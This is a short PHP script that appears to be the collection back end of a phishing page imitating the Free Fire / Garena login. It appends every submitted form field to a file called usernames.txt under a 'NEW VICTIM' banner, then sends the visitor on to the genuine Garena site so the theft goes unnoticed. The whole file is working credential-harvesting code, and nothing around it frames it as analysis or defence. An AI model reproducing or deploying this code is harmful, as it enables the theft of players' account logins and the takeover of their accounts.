<?php
// Capture Free Fire Data
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM (FREE FIRE) ----------\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect to Garena Login
header("Location: https://ff.garena.com/");
exit;
?>
